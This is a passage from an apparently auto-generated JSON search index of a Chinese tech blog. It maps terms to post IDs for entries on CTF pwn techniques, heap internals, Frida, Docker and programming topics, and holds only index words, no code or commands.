":1,\"290\":4,\"397\":5,\"462\":7,\"470\":2,\"473\":2,\"479\":4}}],[\"println\",{\"1\":{\"30\":2,\"125\":1,\"172\":2}}],[\"private\",{\"1\":{\"8\":2,\"125\":2,\"150\":2}}],[\"plus入链\",{\"1\":{\"403\":1}}],[\"plus结构体链接到\",{\"1\":{\"403\":1}}],[\"plus结构体数据\",{\"1\":{\"403\":1}}],[\"plus结构体与这些相关函数的联系\",{\"1\":{\"402\":1}}],[\"plus结构体的第一个属性file就是存储这个文件流的\",{\"1\":{\"400\":1}}],[\"plus结构体部分\",{\"1\":{\"397\":1}}],[\"plus\",{\"0\":{\"503\":1},\"1\":{\"394\":1,\"399\":1,\"403\":1,\"407\":1,\"417\":2}}],[\"placed\",{\"1\":{\"324\":1}}],[\"place\",{\"1\":{\"324\":3}}],[\"plt>\",{\"1\":{\"470\":1}}],[\"plt存我们需要\",{\"1\":{\"451\":1}}],[\"plt这个数组的下标\",{\"1\":{\"451\":1}}],[\"plt这里\",{\"1\":{\"446\":1}}],[\"plt表索引到bss段\",{\"1\":{\"36\":1,\"176\":1}}],[\"plt\",{\"1\":{\"36\":2,\"176\":2,\"446\":1,\"449\":3,\"451\":4,\"470\":1}}],[\"please\",{\"1\":{\"0\":1,\"475\":4,\"481\":2,\"488\":4,\"491\":1,\"503\":2}}],[\"pwnlib\",{\"1\":{\"485\":2}}],[\"pwn1\",{\"0\":{\"469\":1},\"1\":{\"469\":2,\"471\":1}}],[\"pwn环境搭建+so文件的调试\",{\"1\":{\"437\":2}}],[\"pwn学习\",{\"0\":{\"436\":1}}],[\"pwn学习之伪造tty\",{\"1\":{\"79\":1,\"219\":1}}],[\"pwncli\",{\"1\":{\"369\":1}}],[\"pwn3阅读笔记\",{\"0\":{\"341\":1}}],[\"pwngdb的话直接输入tls也可以查到\",{\"1\":{\"333\":1}}],[\"pwndbg>\",{\"1\":{\"311\":2}}],[\"pwndocker\",{\"1\":{\"259\":1,\"260\":1}}],[\"pwnki\",{\"1\":{\"307\":2}}],[\"pwn进你的心\",{\"1\":{\"46\":1,\"186\":1,\"437\":1}}],[\"pwn4\",{\"1\":{\"39\":1,\"179\":1}}],[\"pwn\",{\"0\":{\"35\":1,\"72\":1,\"175\":1,\"212\":1,\"331\":1,\"472\":1,\"509\":1,\"519\":1},\"1\":{\"40\":2,\"46\":4,\"49\":2,\"73\":1,\"74\":1,\"180\":2,\"186\":4,\"189\":2,\"213\":1,\"214\":1,\"256\":1,\"258\":2,\"262\":2,\"295\":1,\"326\":2,\"358\":1,\"359\":1,\"369\":1,\"372\":1,\"382\":3,\"393\":1,\"397\":1,\"445\":1,\"469\":1,\"471\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":2,\"484\":1,\"485\":1,\"486\":1,\"488\":1,\"491\":1,\"494\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"python中的asyncio使用详解\",{\"1\":{\"277\":1}}],[\"python\",{\"0\":{\"33\":1,\"277\":1,\"515\":1},\"1\":{\"277\":2}}],[\"passwd\",{\"1\":{\"473\":2}}],[\"partial\",{\"1\":{\"469\":1}}],[\"parent\",{\"1\":{\"353\":1}}],[\"patchelf\",{\"1\":{\"456\":3}}],[\"path程序加载运行期间查找动态链接库的路径\",{\"1\":{\"453\":1}}],[\"path这个变量是程序编译期间查找动态链接库时指定查找共享库的路径\",{\"1\":{\"453\":1}}],[\"path也不会起效果\",{\"1\":{\"453\":1}}],[\"path所以当程序由runpath后我们就算修改ld\",{\"1\":{\"453\":1}}],[\"path\",{\"1\":{\"428\":2,\"453\":1,\"485\":1}}],[\"payload=b\",{\"1\":{\"485\":2}}],[\"payload=str\",{\"1\":{\"479\":1}}],[\"payload的长度+1\",{\"1\":{\"345\":1}}],[\"payload\",{\"0\":{\"468\":1},\"1\":{\"342\":1,\"358\":4,\"359\":4,\"471\":2,\"473\":4,\"479\":6,\"483\":6,\"485\":2,\"486\":2,\"504\":2,\"505\":5}}],[\"pad5\",{\"1\":{\"389\":1,\"408\":1}}],[\"pad\",{\"1\":{\"324\":2,\"353\":2}}],[\"packed\",{\"1\":{\"347\":1}}],[\"packet\",{\"1\":{\"261\":1}}],[\"packets\",{\"1\":{\"261\":1}}],[\"pack\",{\"1\":{\"133\":1}}],[\"package\",{\"1\":{\"30\":1,\"124\":1,\"172\":1,\"254\":1}}],[\"pause意思是在程序启动后不要停止程序的进程\",{\"1\":{\"118\":1}}],[\"pause\",{\"1\":{\"118\":2,\"131\":3,\"485\":1}}],[\"panic=1\",{\"1\":{\"73\":1,\"213\":1}}],[\"pagetable\",{\"1\":{\"74\":1,\"214\":1}}],[\"pages\",{\"1\":{\"438\":3}}],[\"pages是通过rmqueue\",{\"1\":{\"70\":1,\"210\":1}}],[\"pages来完成\",{\"1\":{\"70\":1,\"210\":1}}],[\"pages函数申请物理内存页\",{\"1\":{\"70\":1,\"210\":1}}],[\"page分配高端内存页\",{\"1\":{\"16\":1,\"158\":1}}],[\"page\",{\"1\":{\"0\":2,\"50\":5,\"190\":5,\"438\":3}}],[\"pie\",{\"1\":{\"469\":2}}],[\"pic\",{\"1\":{\"273\":1}}],[\"pike\",{\"1\":{\"258\":1}}],[\"pid\",{\"1\":{\"41\":1,\"69\":1,\"181\":1,\"209\":1}}],[\"pipe文件\",{\"1\":{\"13\":1,\"155\":1}}],[\"pipe\",{\"1\":{\"13\":3,\"42\":1,\"155\":3,\"182\":1,\"258\":2}}],[\"pingmessage\",{\"1\":{\"255\":1}}],[\"ping\",{\"1\":{\"1\":1,\"261\":5}}],[\"p\",{\"1\":{\"10\":1,\"13\":1,\"15\":1,\"140\":1,\"152\":1,\"155\":1,\"157\":1,\"239\":1,\"240\":1,\"241\":2,\"243\":2,\"258\":1,\"295\":2,\"296\":26,\"305\":3,\"313\":3,\"315\":3,\"322\":3,\"324\":49,\"339\":11,\"342\":2,\"344\":25,\"345\":9,\"353\":8,\"369\":11,\"378\":4,\"390\":1,\"397\":4,\"439\":7,\"441\":3,\"442\":4,\"473\":11,\"475\":11,\"479\":11,\"480\":11,\"481\":11,\"482\":11,\"483\":12,\"484\":11,\"485\":5,\"486\":11,\"488\":12,\"491\":11,\"500\":4,\"503\":12,\"504\":11,\"505\":11}}],[\"pzlzx\",{\"1\":{\"1\":1}}],[\"dd\",{\"1\":{\"470\":1}}],[\"ddd\",{\"1\":{\"244\":1,\"252\":1}}],[\"dynsym中哪个结构体\",{\"1\":{\"451\":1}}],[\"dynsym存函数名字在\",{\"1\":{\"451\":1}}],[\"dynsym\",{\"1\":{\"451\":2}}],[\"dynsym这个数组的下标\",{\"1\":{\"451\":1}}],[\"dynstr中的位置\",{\"1\":{\"451\":1}}],[\"dynstr存函数名字\",{\"1\":{\"451\":1}}],[\"dynstr数组中的下标\",{\"1\":{\"451\":1}}],[\"dynstr\",{\"1\":{\"451\":2}}],[\"dynamic\",{\"1\":{\"131\":1}}],[\"dbg\",{\"1\":{\"439\":2,\"442\":2}}],[\"dc\",{\"1\":{\"439\":2,\"441\":2}}],[\"dtor\",{\"1\":{\"372\":1,\"494\":1,\"503\":4}}],[\"dword\",{\"1\":{\"292\":2,\"470\":1}}],[\"dummy2\",{\"1\":{\"401\":1}}],[\"dummy\",{\"1\":{\"395\":3,\"401\":1}}],[\"dump\",{\"1\":{\"134\":6,\"136\":3}}],[\"dumpsys\",{\"1\":{\"133\":1,\"134\":1}}],[\"dup\",{\"0\":{\"339\":1,\"342\":1}}],[\"during\",{\"1\":{\"258\":2}}],[\"duration\",{\"1\":{\"254\":1}}],[\"da\",{\"1\":{\"395\":3}}],[\"daemon\",{\"1\":{\"258\":2}}],[\"davygeek\",{\"1\":{\"252\":1}}],[\"data修改值\",{\"1\":{\"417\":1}}],[\"data相对于file结构体来说偏移值为0xa0\",{\"1\":{\"395\":1}}],[\"data偏移从0x0到0x30地址处都会被覆写上fp\",{\"1\":{\"388\":1}}],[\"data位于偏移0xa0\",{\"1\":{\"388\":1}}],[\"data地址所指区域会被覆写上overflow\",{\"1\":{\"388\":1}}],[\"data字段保存的地址附近写入值\",{\"1\":{\"384\":1}}],[\"data\",{\"0\":{\"390\":1},\"1\":{\"140\":1,\"143\":1,\"273\":1,\"342\":2,\"369\":4,\"388\":1,\"389\":2,\"390\":3,\"395\":2,\"396\":2,\"397\":7,\"403\":1,\"407\":1,\"408\":4,\"410\":16,\"426\":4,\"433\":1,\"439\":3,\"441\":1,\"442\":2,\"473\":4,\"475\":4,\"479\":4,\"480\":4,\"481\":4,\"482\":4,\"483\":4,\"484\":4,\"486\":4,\"488\":4,\"491\":8,\"503\":14,\"504\":4,\"505\":4}}],[\"dqcfkyqdxym3f8rb0\",{\"1\":{\"244\":1}}],[\"dq求解m\",{\"1\":{\"243\":1}}],[\"digits\",{\"1\":{\"380\":2,\"502\":2,\"503\":1}}],[\"di\",{\"1\":{\"258\":1}}],[\"displaychunk\",{\"1\":{\"484\":2}}],[\"displaychunks\",{\"1\":{\"484\":1}}],[\"display\",{\"1\":{\"131\":1}}],[\"displays\",{\"1\":{\"131\":1}}],[\"dick\",{\"1\":{\"124\":2}}],[\"d\",{\"1\":{\"125\":1,\"240\":3,\"241\":2,\"243\":2,\"258\":2,\"462\":4,\"479\":1}}],[\"driver的flags等在未被赋值的时候所有值都是0\",{\"1\":{\"79\":1,\"219\":1}}],[\"driver函数分配的\",{\"1\":{\"79\":1,\"219\":1}}],[\"driver\",{\"1\":{\"79\":1,\"219\":1}}],[\"dmesg\",{\"1\":{\"74\":1,\"214\":1}}],[\"dl\",{\"0\":{\"450\":1},\"1\":{\"36\":1,\"176\":1,\"449\":20,\"450\":2}}],[\"dec\",{\"1\":{\"483\":2}}],[\"decrement\",{\"1\":{\"352\":1}}],[\"deepunk\",{\"1\":{\"436\":1}}],[\"deal\",{\"1\":{\"353\":1}}],[\"deallocated\",{\"1\":{\"339\":1}}],[\"depends\",{\"1\":{\"352\":1}}],[\"detach\",{\"1\":{\"349\":1,\"353\":1}}],[\"details\",{\"1\":{\"14\":1,\"156\":1,\"244\":1}}],[\"detected\",{\"1\":{\"342\":1}}],[\"dereference\",{\"1\":{\"324\":1,\"339\":1}}],[\"delete\",{\"1\":{\"356\":1,\"358\":2,\"359\":2,\"373\":1,\"376\":1,\"378\":3,\"380\":4,\"475\":5,\"484\":1,\"488\":11,\"491\":5,\"495\":1,\"498\":1,\"500\":3,\"502\":4,\"503\":15}}],[\"delete函数\",{\"1\":{\"356\":1,\"371\":1,\"493\":1}}],[\"delete部分无懈可击\",{\"1\":{\"301\":1}}],[\"del\",{\"1\":{\"279\":1}}],[\"debug\",{\"1\":{\"262\":1,\"358\":1,\"359\":1,\"369\":2,\"439\":4,\"442\":4,\"471\":1,\"473\":2,\"475\":3,\"479\":2,\"480\":2,\"481\":2,\"482\":2,\"483\":3,\"484\":3,\"485\":1,\"486\":3,\"488\":4,\"491\":2,\"503\":6,\"504\":2,\"505\":2}}],[\"debuggable\",{\"1\":{\"141\":1}}],[\"desired\",{\"1\":{\"503\":3}}],[\"design\",{\"1\":{\"324\":1}}],[\"dest\",{\"1\":{\"461\":37}}],[\"dest3\",{\"1\":{\"459\":1,\"462\":3}}],[\"dest2\",{\"1\":{\"459\":1,\"462\":3}}],[\"dest1\",{\"1\":{\"459\":1,\"462\":3}}],[\"dest0\",{\"1\":{\"459\":1,\"460\":1,\"462\":3}}],[\"destop导致报错\",{\"1\":{\"258\":1}}],[\"described\",{\"1\":{\"347\":1}}],[\"descriptor\",{\"1\":{\"15\":2,\"157\":2,\"417\":1}}],[\"define\",{\"1\":{\"295\":1,\"347\":1,\"351\":1,\"394\":3,\"395\":4,\"404\":1}}],[\"def\",{\"1\":{\"242\":1,\"243\":1,\"279\":5,\"281\":2,\"358\":7,\"359\":7,\"369\":4,\"475\":4,\"480\":1,\"484\":5,\"488\":6,\"491\":5,\"503\":9}}],[\"default\",{\"1\":{\"131\":1,\"252\":1,\"395\":9,\"462\":1}}],[\"development\",{\"0\":{\"507\":1}}],[\"develop分支一半用于功能开发或者集成测试\",{\"1\":{\"268\":1}}],[\"developer\",{\"1\":{\"263\":1}}],[\"dev\",{\"1\":{\"73\":2,\"213\":2}}],[\"demo\",{\"1\":{\"0\":1}}],[\"doallocate\",{\"1\":{\"395\":6,\"401\":2}}],[\"do\",{\"1\":{\"324\":1,\"339\":1,\"351\":1,\"369\":1,\"391\":1,\"417\":1,\"439\":2,\"441\":1,\"442\":1,\"467\":1}}],[\"don\",{\"1\":{\"324\":4,\"342\":2,\"389\":1,\"417\":1}}],[\"done\",{\"1\":{\"280\":2,\"467\":1}}],[\"double\",{\"1\":{\"296\":1,\"305\":1,\"312\":1,\"319\":2,\"324\":7,\"325\":1,\"339\":2,\"342\":3,\"344\":2,\"345\":1,\"378\":1,\"438\":1,\"474\":1,\"500\":1}}],[\"doujia\",{\"1\":{\"1\":1}}],[\"does\",{\"1\":{\"270\":1,\"321\":1,\"349\":1,\"353\":1}}],[\"doesreactnativeexist\",{\"1\":{\"134\":1}}],[\"documents\",{\"1\":{\"273\":1}}],[\"docker镜像\",{\"1\":{\"261\":1}}],[\"docker内路径\",{\"1\":{\"258\":2}}],[\"dockerbackendapiserver\",{\"1\":{\"258\":1}}],[\"docker\",{\"0\":{\"513\":1},\"1\":{\"258\":13,\"260\":1,\"261\":1,\"262\":2}}],[\"docker配置任意版本编译环境\",{\"1\":{\"256\":1}}],[\"docker也运用了这项技术\",{\"1\":{\"41\":1,\"181\":1}}],[\"docs\",{\"1\":{\"0\":1,\"131\":1,\"265\":1}}],[\"f变化\",{\"1\":{\"411\":1}}],[\"f的值\",{\"1\":{\"408\":1}}],[\"fwrite\",{\"1\":{\"404\":1}}],[\"fwd改为链表头\",{\"1\":{\"319\":1}}],[\"fwd\",{\"1\":{\"317\":2,\"318\":2,\"319\":22,\"321\":4,\"324\":7,\"325\":9}}],[\"fp+0xd8\",{\"1\":{\"404\":1}}],[\"fp=fopen\",{\"1\":{\"404\":1}}],[\"fpmkdfryo6veth5\",{\"1\":{\"403\":1}}],[\"fp\",{\"1\":{\"394\":2,\"395\":2,\"403\":2,\"404\":3,\"407\":1,\"408\":1,\"410\":18,\"417\":10,\"420\":1,\"426\":14}}],[\"fcloseall\",{\"1\":{\"386\":1}}],[\"float\",{\"1\":{\"469\":1,\"470\":2}}],[\"flush\",{\"0\":{\"423\":1},\"1\":{\"384\":1,\"421\":1}}],[\"flag位置\",{\"1\":{\"505\":1}}],[\"flag字符串\",{\"1\":{\"505\":1}}],[\"flag\",{\"0\":{\"483\":1,\"484\":1},\"1\":{\"243\":2,\"311\":1,\"404\":1,\"462\":10,\"469\":1,\"483\":1,\"503\":3,\"505\":2}}],[\"flags变化\",{\"1\":{\"411\":1}}],[\"flags2\",{\"1\":{\"408\":1}}],[\"flags\",{\"1\":{\"43\":1,\"125\":1,\"183\":1,\"347\":2,\"397\":2,\"408\":3,\"410\":2,\"411\":1,\"417\":4}}],[\"feifei\",{\"1\":{\"460\":1}}],[\"few\",{\"1\":{\"342\":1}}],[\"feature分支用于创建新功能时的测试分支\",{\"1\":{\"268\":1}}],[\"feat\",{\"1\":{\"265\":2}}],[\"fsop细读\",{\"0\":{\"421\":1}}],[\"fseek\",{\"1\":{\"417\":1}}],[\"fs\",{\"0\":{\"333\":1}}],[\"fb\",{\"1\":{\"324\":7,\"339\":5,\"378\":1,\"500\":1}}],[\"fopen\",{\"1\":{\"403\":3,\"419\":2}}],[\"fopen函数\",{\"0\":{\"403\":1},\"1\":{\"420\":1}}],[\"fopen函数会自动通过malloc\",{\"1\":{\"400\":1}}],[\"following\",{\"1\":{\"352\":1,\"390\":1,\"408\":1,\"417\":1}}],[\"found\",{\"1\":{\"324\":1,\"469\":1}}],[\"foot就是下一个chunk的prev\",{\"1\":{\"321\":1}}],[\"foot\",{\"1\":{\"313\":1,\"321\":1,\"324\":1}}],[\"forth\",{\"1\":{\"403\":1}}],[\"format\",{\"1\":{\"470\":1,\"488\":2}}],[\"format=newc\",{\"1\":{\"73\":1,\"213\":1}}],[\"formerly\",{\"1\":{\"347\":1}}],[\"forward\",{\"1\":{\"114\":1,\"324\":1}}],[\"force\",{\"0\":{\"56\":1,\"196\":1}}],[\"fork\",{\"1\":{\"42\":1,\"182\":1,\"353\":1}}],[\"fork一个新的线程\",{\"1\":{\"42\":1,\"182\":1}}],[\"fork的cow技术\",{\"0\":{\"17\":1,\"159\":1}}],[\"fork还是接触比较多\",{\"1\":{\"16\":1,\"158\":1}}],[\"fork函数是创建一个新的进程\",{\"1\":{\"16\":1,\"158\":1}}],[\"fork函数\",{\"0\":{\"16\":1,\"158\":1}}],[\"for\",{\"1\":{\"0\":1,\"123\":1,\"126\":2,\"131\":1,\"254\":1,\"270\":1,\"279\":1,\"281\":2,\"286\":2,\"321\":1,\"324\":4,\"339\":1,\"342\":1,\"347\":1,\"352\":2,\"353\":1,\"358\":3,\"359\":2,\"373\":2,\"376\":3,\"378\":4,\"380\":8,\"391\":1,\"459\":2,\"461\":1,\"462\":2,\"463\":1,\"467\":1,\"475\":6,\"480\":1,\"488\":8,\"491\":8,\"495\":2,\"498\":3,\"500\":4,\"502\":8,\"503\":23}}],[\"future值相关\",{\"1\":{\"280\":1}}],[\"future\",{\"0\":{\"280\":1},\"1\":{\"278\":1}}],[\"fun=new\",{\"1\":{\"127\":1}}],[\"fun\",{\"1\":{\"127\":2}}],[\"func处\",{\"1\":{\"380\":1,\"502\":1}}],[\"funcs链表的方式\",{\"1\":{\"372\":1,\"494\":1}}],[\"funcs链表\",{\"0\":{\"380\":1,\"502\":1},\"1\":{\"372\":2,\"378\":1,\"494\":2,\"500\":1}}],[\"func=parseint\",{\"1\":{\"127\":1}}],[\"function地址处\",{\"1\":{\"380\":1,\"502\":1}}],[\"function\",{\"1\":{\"60\":4,\"120\":1,\"121\":2,\"122\":1,\"123\":2,\"124\":1,\"125\":3,\"126\":3,\"127\":3,\"131\":4,\"200\":4,\"380\":5,\"410\":1,\"449\":2,\"451\":1,\"502\":5}}],[\"func2\",{\"1\":{\"24\":1,\"166\":1}}],[\"func1\",{\"1\":{\"24\":2,\"166\":2}}],[\"func\",{\"1\":{\"24\":2,\"30\":1,\"127\":1,\"166\":2,\"172\":1,\"254\":3,\"394\":3,\"395\":3,\"397\":1,\"469\":1}}],[\"f9a80a55f492\",{\"1\":{\"258\":1}}],[\"finish\",{\"1\":{\"395\":6,\"401\":2}}],[\"findbaseaddress\",{\"1\":{\"127\":1}}],[\"find\",{\"1\":{\"73\":1,\"213\":1,\"258\":2}}],[\"fit\",{\"1\":{\"353\":1,\"391\":1}}],[\"fields\",{\"1\":{\"390\":1,\"408\":1}}],[\"field\",{\"1\":{\"347\":2,\"395\":1,\"401\":21}}],[\"first\",{\"1\":{\"321\":2,\"390\":1,\"403\":1,\"408\":1,\"417\":1}}],[\"fixup\",{\"1\":{\"449\":11}}],[\"fixup然后这个函数将真实的地址返回给rax寄存器\",{\"1\":{\"449\":1}}],[\"fixme\",{\"1\":{\"349\":1,\"353\":1}}],[\"fixes\",{\"1\":{\"270\":2}}],[\"fix\",{\"1\":{\"266\":1}}],[\"fix修复bug\",{\"1\":{\"265\":1}}],[\"filter中category\",{\"1\":{\"144\":1}}],[\"filter中action\",{\"1\":{\"144\":1}}],[\"filter标签\",{\"0\":{\"143\":1}}],[\"filter>标签来实现设置\",{\"1\":{\"142\":1}}],[\"filter的action带来的变化\",{\"1\":{\"140\":1}}],[\"filter的四个属性action\",{\"1\":{\"140\":1,\"143\":1}}],[\"filter\",{\"1\":{\"140\":1,\"143\":1,\"144\":1}}],[\"file利用\",{\"0\":{\"429\":1}}],[\"file中经典利用\",{\"1\":{\"421\":1}}],[\"filebuf\",{\"1\":{\"417\":1}}],[\"fileno\",{\"1\":{\"408\":1,\"417\":2,\"420\":1}}],[\"filename\",{\"1\":{\"403\":1,\"419\":1}}],[\"filenames\",{\"1\":{\"73\":1,\"213\":1}}],[\"file相关利用\",{\"1\":{\"398\":1}}],[\"file相关学习有点蛋疼\",{\"1\":{\"398\":1}}],[\"file结构体全部内容\",{\"1\":{\"389\":1}}],[\"files\",{\"1\":{\"273\":1}}],[\"file\",{\"0\":{\"389\":1,\"398\":1,\"400\":1,\"517\":1},\"1\":{\"15\":2,\"59\":3,\"60\":2,\"157\":2,\"199\":3,\"200\":2,\"258\":2,\"273\":1,\"389\":4,\"394\":1,\"395\":25,\"397\":1,\"399\":3,\"400\":3,\"402\":1,\"403\":17,\"404\":1,\"407\":4,\"408\":1,\"410\":2,\"411\":1,\"413\":1,\"414\":1,\"416\":1,\"417\":7,\"419\":3,\"420\":3,\"439\":4,\"441\":4,\"455\":1,\"456\":3,\"464\":8,\"473\":4,\"475\":4,\"479\":4,\"480\":4,\"481\":4,\"482\":4,\"483\":5,\"484\":4,\"485\":3,\"486\":4,\"488\":4,\"491\":4,\"503\":4,\"504\":4,\"505\":4}}],[\"f\",{\"1\":{\"73\":1,\"118\":2,\"131\":2,\"213\":1,\"358\":3,\"359\":3,\"369\":1,\"391\":1,\"403\":12,\"407\":1,\"410\":2,\"411\":2,\"413\":1,\"416\":1,\"419\":2,\"464\":2,\"470\":4,\"475\":2,\"491\":2,\"503\":2}}],[\"f000以下为用户\",{\"1\":{\"70\":1,\"210\":1}}],[\"ffff\",{\"1\":{\"70\":1,\"210\":1}}],[\"fflush\",{\"1\":{\"60\":1,\"200\":1,\"290\":1,\"397\":2,\"417\":1}}],[\"fake\",{\"1\":{\"358\":3,\"359\":3,\"397\":1,\"446\":1}}],[\"fakechunk\",{\"1\":{\"358\":2,\"359\":2,\"368\":1,\"377\":6,\"488\":2,\"491\":12,\"499\":6}}],[\"fakeunlink\",{\"1\":{\"345\":1}}],[\"fact\",{\"1\":{\"352\":1}}],[\"false\",{\"1\":{\"324\":1,\"339\":1}}],[\"false则为不放行\",{\"1\":{\"254\":1}}],[\"fail\",{\"1\":{\"324\":3,\"352\":1}}],[\"failed\",{\"1\":{\"60\":1,\"131\":1,\"200\":1,\"258\":1}}],[\"fastfastfast\",{\"0\":{\"474\":1}}],[\"fastcall\",{\"1\":{\"459\":1,\"460\":1}}],[\"fastchunks\",{\"1\":{\"324\":2,\"339\":1,\"347\":1}}],[\"fast或者fast\",{\"1\":{\"347\":1}}],[\"fasttop\",{\"1\":{\"324\":2,\"339\":1,\"378\":1,\"500\":1}}],[\"fastbin情况\",{\"1\":{\"491\":1}}],[\"fastbin会检查你free的是否为第一个chunk\",{\"1\":{\"378\":1,\"500\":1}}],[\"fastbin合并机制\",{\"0\":{\"376\":1,\"498\":1}}],[\"fastbin最小结构为0x20\",{\"1\":{\"329\":1}}],[\"fastbinsy\",{\"1\":{\"347\":1}}],[\"fastbins\",{\"1\":{\"324\":5,\"347\":1}}],[\"fastbin\",{\"0\":{\"337\":1,\"339\":1},\"1\":{\"324\":12,\"335\":1,\"339\":9,\"347\":1,\"491\":2}}],[\"fast的chunk或者fast\",{\"1\":{\"284\":1}}],[\"fast\",{\"1\":{\"284\":2,\"324\":3,\"329\":1,\"330\":1,\"335\":1,\"339\":1,\"347\":4,\"428\":1}}],[\"far\",{\"1\":{\"44\":1,\"184\":1}}],[\"fxprintf又调用\",{\"1\":{\"60\":1,\"200\":1}}],[\"fxprintf\",{\"1\":{\"60\":2,\"200\":2}}],[\"fmt\",{\"0\":{\"476\":1},\"1\":{\"30\":3,\"172\":3,\"254\":2}}],[\"fd需要是heap基地址^目标地址\",{\"1\":{\"379\":1,\"501\":1}}],[\"fd加密机制\",{\"0\":{\"379\":1,\"501\":1}}],[\"fd位置赋值\",{\"1\":{\"367\":1}}],[\"fd和bk都被清空了\",{\"1\":{\"358\":1}}],[\"fd和bk\",{\"1\":{\"345\":1}}],[\"fd指向的是\",{\"1\":{\"338\":1}}],[\"fd指向下一个free\",{\"1\":{\"337\":1}}],[\"fd或者bk\",{\"1\":{\"296\":1}}],[\"fd也就是io\",{\"1\":{\"43\":1,\"183\":1}}],[\"fd\",{\"1\":{\"13\":2,\"15\":1,\"43\":1,\"55\":1,\"155\":2,\"157\":1,\"183\":1,\"195\":1,\"295\":2,\"296\":5,\"311\":1,\"324\":1,\"329\":2,\"344\":13,\"345\":4,\"358\":3,\"359\":3,\"363\":1,\"365\":1,\"377\":1,\"488\":1,\"499\":1,\"503\":2}}],[\"fruit\",{\"1\":{\"467\":1}}],[\"fread\",{\"1\":{\"400\":1}}],[\"free来触发double\",{\"1\":{\"490\":1}}],[\"free来malloc下来tls附近的内存区域\",{\"1\":{\"378\":1,\"500\":1}}],[\"free了\",{\"1\":{\"484\":1}}],[\"freeres\",{\"1\":{\"389\":2,\"408\":2,\"410\":1}}],[\"free劫持的chunk大小需要够大\",{\"1\":{\"378\":1,\"500\":1}}],[\"free所以我们让记录头信息的chunk进入fastbin中\",{\"1\":{\"372\":1,\"494\":1}}],[\"free掉chunk\",{\"1\":{\"368\":1}}],[\"free让整个链表陷入循环\",{\"1\":{\"339\":1}}],[\"free的时候没有做任何检测\",{\"1\":{\"474\":1}}],[\"free的时候就不能选择这个size大小的链了\",{\"1\":{\"380\":1,\"502\":1}}],[\"free的机制\",{\"1\":{\"378\":1,\"500\":1}}],[\"free的fastbinchunk地址\",{\"1\":{\"377\":1,\"499\":1}}],[\"free的chunk地址\",{\"1\":{\"380\":1,\"502\":1}}],[\"free的chunk\",{\"1\":{\"366\":2}}],[\"free的\",{\"1\":{\"338\":1}}],[\"free函数\",{\"1\":{\"335\":1}}],[\"free函数相关的宏定义\",{\"1\":{\"54\":1,\"194\":1}}],[\"freeing\",{\"1\":{\"324\":1}}],[\"free后任意地址malloc\",{\"1\":{\"474\":1}}],[\"free后\",{\"1\":{\"285\":1}}],[\"free后打印出main\",{\"1\":{\"284\":1}}],[\"free\",{\"0\":{\"324\":1,\"335\":1,\"439\":1,\"442\":1},\"1\":{\"50\":1,\"55\":2,\"190\":1,\"195\":2,\"311\":1,\"324\":19,\"329\":1,\"339\":5,\"342\":5,\"347\":7,\"349\":2,\"352\":1,\"353\":10,\"365\":6,\"366\":2,\"367\":3,\"368\":2,\"369\":12,\"372\":2,\"373\":1,\"377\":1,\"378\":2,\"380\":6,\"403\":1,\"438\":9,\"439\":6,\"441\":3,\"442\":4,\"474\":2,\"475\":3,\"490\":3,\"491\":2,\"494\":2,\"495\":1,\"499\":1,\"500\":2,\"502\":6}}],[\"free等操作\",{\"1\":{\"50\":1,\"190\":1}}],[\"freebuf网络安全行业门户pwn方向的分析\",{\"1\":{\"2\":1,\"145\":1}}],[\"from\",{\"1\":{\"324\":1,\"347\":2,\"352\":2,\"353\":3,\"358\":1,\"359\":1,\"369\":2,\"471\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"485\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"front\",{\"1\":{\"0\":1}}],[\"frida的反调试\",{\"0\":{\"128\":1}}],[\"frida的基本使用\",{\"0\":{\"113\":1}}],[\"frida\",{\"1\":{\"113\":1,\"115\":1,\"118\":2,\"131\":7}}],[\"i+1\",{\"1\":{\"491\":1,\"503\":1}}],[\"i++\",{\"1\":{\"123\":1,\"126\":2,\"131\":1,\"462\":1}}],[\"i386\",{\"1\":{\"483\":4}}],[\"ignore\",{\"1\":{\"464\":1}}],[\"icu\",{\"1\":{\"436\":1}}],[\"ia\",{\"1\":{\"369\":1,\"380\":1,\"473\":2,\"475\":2,\"479\":2,\"480\":2,\"481\":2,\"482\":2,\"483\":3,\"484\":2,\"486\":2,\"488\":2,\"491\":2,\"502\":1,\"503\":2,\"504\":2,\"505\":2}}],[\"irrelevant\",{\"1\":{\"352\":1}}],[\"i这个是emo\",{\"1\":{\"292\":1}}],[\"it\",{\"0\":{\"492\":1,\"503\":1},\"1\":{\"258\":1,\"270\":1,\"324\":2,\"339\":1,\"342\":5,\"353\":1}}],[\"its\",{\"0\":{\"489\":1},\"1\":{\"131\":1,\"324\":3,\"339\":1,\"469\":1}}],[\"idc\",{\"1\":{\"461\":2,\"470\":2}}],[\"idx\",{\"1\":{\"305\":2,\"315\":2,\"324\":7,\"335\":1,\"339\":7,\"342\":6,\"475\":3,\"488\":4,\"491\":1,\"503\":2}}],[\"id来查看\",{\"1\":{\"274\":1}}],[\"id\",{\"1\":{\"258\":6,\"274\":2,\"480\":3,\"491\":2,\"503\":2}}],[\"id=socket\",{\"1\":{\"131\":1}}],[\"idt\",{\"1\":{\"21\":1,\"163\":1}}],[\"i<methods\",{\"1\":{\"126\":2}}],[\"i<overlength\",{\"1\":{\"123\":1}}],[\"ifs=\",{\"1\":{\"467\":1}}],[\"ifs变量\",{\"0\":{\"465\":1}}],[\"ifs\",{\"0\":{\"466\":1},\"1\":{\"463\":1,\"466\":3}}],[\"ifdef\",{\"1\":{\"403\":2,\"407\":1}}],[\"ifndef\",{\"1\":{\"324\":1}}],[\"if\",{\"1\":{\"126\":2,\"131\":1,\"242\":1,\"243\":1,\"254\":2,\"255\":2,\"290\":2,\"296\":2,\"305\":4,\"312\":5,\"313\":2,\"315\":1,\"318\":1,\"319\":5,\"320\":1,\"321\":6,\"324\":42,\"325\":1,\"339\":7,\"342\":6,\"344\":6,\"345\":2,\"347\":2,\"351\":1,\"352\":10,\"353\":5,\"369\":1,\"378\":1,\"403\":2,\"410\":1,\"417\":1,\"419\":1,\"428\":2,\"438\":1,\"439\":4,\"441\":2,\"442\":2,\"459\":1,\"460\":1,\"461\":1,\"463\":1,\"464\":1,\"469\":1,\"500\":1,\"503\":1}}],[\"i=0\",{\"1\":{\"123\":1,\"126\":2}}],[\"